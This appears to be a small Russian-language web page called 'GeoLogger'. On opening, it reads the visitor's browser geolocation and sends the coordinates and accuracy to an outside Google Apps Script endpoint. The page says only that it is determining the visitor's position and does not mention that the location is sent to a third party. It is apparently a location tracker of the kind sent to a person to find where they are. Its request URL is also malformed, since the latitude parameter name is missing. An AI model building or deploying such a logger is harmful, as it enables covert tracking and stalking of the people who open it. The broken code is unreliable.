<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>GeoLogger</title>
</head>
<body>
  <h2>Определение геопозиции…</h2>

  <script>
    navigator.geolocation.getCurrentPosition(function(position) {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;
      const acc = position.coords.accuracy;

      fetch("https://script.google.com/macros/s/AKfycbwlw3rbYm_Or8tPFxiMx8_oRv0vNM2sxUe43Zf7sS1DMdzmGYl_Jmvc20lfDO0ixRL9/exec" + lat + "&lon=" + lon + "&acc=" + acc)
        .then(res => res.text())
        .then(data => {
          document.body.innerHTML += `<p>Отправлено: ${data}</p>`;
        })
        .catch(err => {
          document.body.innerHTML += `<p>Ошибка: ${err}</p>`;
        });
    }, function(err) {
      document.body.innerHTML += `<p>Ошибка геолокации: ${err.message}</p>`;
    });
  </script>
</body>
</html>
